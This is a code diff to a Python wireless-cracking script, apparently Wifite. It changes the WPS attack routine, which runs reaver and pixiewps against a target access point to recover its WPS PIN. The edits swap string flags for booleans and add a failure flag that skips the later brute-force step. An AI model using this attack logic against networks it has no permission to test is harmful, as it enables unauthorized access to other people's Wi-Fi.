@@ -2873,8 +2873,9 @@ def wps_attack(iface, target):
 	             (G, W, G+target.ssid+W+' ('+G+target.bssid+W+')'+W)
 
 	p_start = int(time.time())
-	pixie="false"
-	pixie_exit="false"
+	pixie=False
+	pixie_exit=False
+	pixie_fail=False
 	p_run = (p_start + PIXIE_TIMEOUT)
 
 	WPSpin=""
@@ -2899,9 +2900,9 @@ def wps_attack(iface, target):
 	p = open(temp + "reaver_out.out")
                                                 
 	try:
-		while pixie_exit == "false":
+		while pixie_exit == False:
 
-			while pixie == "false" or pixie_exit == "false":
+			while pixie == False or pixie_exit == False:
 
 				time.sleep(1)
 				line = p.readline()
@@ -2923,13 +2924,13 @@ def wps_attack(iface, target):
 				if "E-Hash2" in line:
 					os.kill(pid, signal.SIGQUIT)
 					print GR+' [+]'+G+' E-Hash2 found'
-					pixie = "true"
-					pixie_exit = "true"
+					pixie = True
+					pixie_exit = True
 				if PIXIE_TIMEOUT > 0 and p_run < int(time.time()):
 					print R+'\n [!]'+O+' unable to complete in %d seconds' % (PIXIE_TIMEOUT)
 					print R+' [+]'+W+' skipping pixiewps on %s' % (O+target.ssid+W)
 					WPSpin="WPS pin not found!"
-					pixie_exit="True"	
+					pixie_exit=True	
 					break
 
 	except KeyboardInterrupt:
@@ -2939,7 +2940,7 @@ def wps_attack(iface, target):
 			print ''
 			exit_gracefully(0)
 
-	if pixie == "true":
+	if pixie == True:
 		print GR+' [+]'+G+' Cracking using pixiewps...'
 
 		p = open(temp + "reaver_out.out")
@@ -2983,10 +2984,12 @@ def wps_attack(iface, target):
 			line = f.readline()
 			if "WPS pin:" in line:
 				WPSpin=line
-				pixie_exit="true"
+				pixie_exit=True
+				pixie_fail=False
 			if "WPS pin not found!" in line:
 				WPSpin="WPS pin not found!"
-				pixie_exit="exit"
+				pixie_exit=True
+				pixie_fail=True
 		f.close()
 		
 		os.remove(temp + "fPixiewpsErrors.txt")
@@ -2995,6 +2998,7 @@ def wps_attack(iface, target):
 
 	if WPSpin=="WPS pin not found!" or WPSpin=="":	#Crap, timed out or didn't work. Run a regular reaver brute-force
 		print GR+'\n [+]'+G+' Pixiewps attack failed!'
+		pixie_fail=True
 		cmd = ['reaver',
 			'-i', iface,
 		       	'-b', target.bssid,
@@ -3020,7 +3024,7 @@ def wps_attack(iface, target):
 
 
 	
-	if PIXIE_NOPSK == False:
+	if PIXIE_NOPSK == False and pixie_fail == False:
 		print GR+'\n [0:00:00]'+W+' initializing %sWPS PIN attack%s on %s' % \
 		             (G, W, G+target.ssid+W+' ('+G+target.bssid+W+')'+W)
 
@@ -3158,7 +3162,7 @@ if __name__ == '__main__':
 	try:
 		banner()
 		main()
-	except KeyboardInterrupt:           print R+'\n (^D)'+O+' interrupted\n'+W
+	except KeyboardInterrupt: print R+'\n (^D)'+O+' interrupted\n'+W
 
 	except EOFError:          print R+'\n (^D)'+O+' interrupted\n'+W
 	
